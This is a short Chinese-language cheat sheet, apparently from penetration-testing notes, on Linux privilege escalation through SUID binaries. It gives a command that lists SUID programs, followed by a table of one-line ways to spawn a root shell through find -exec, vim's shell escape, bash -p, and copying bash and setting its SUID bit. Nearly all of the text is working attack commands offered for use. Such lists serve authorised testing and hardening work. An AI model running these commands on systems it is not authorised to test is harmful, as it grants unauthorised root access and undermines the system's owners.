先找到SUID程序：

find / -perm -4000 -type f 2>/dev/null

| 程序   | 提权方法                                                     |
| ------ | ------------------------------------------------------------ |
| `find` | `find / -name test -exec /bin/bash \;`                       |
| `vim`  | `vim -c ':!/bin/bash'`                                       |
| `bash` | `./bash -p`                                                  |
| `cp`   | 复制 `/bin/bash` 到当前目录，`chmod +s bash`，再 `./bash -p` |

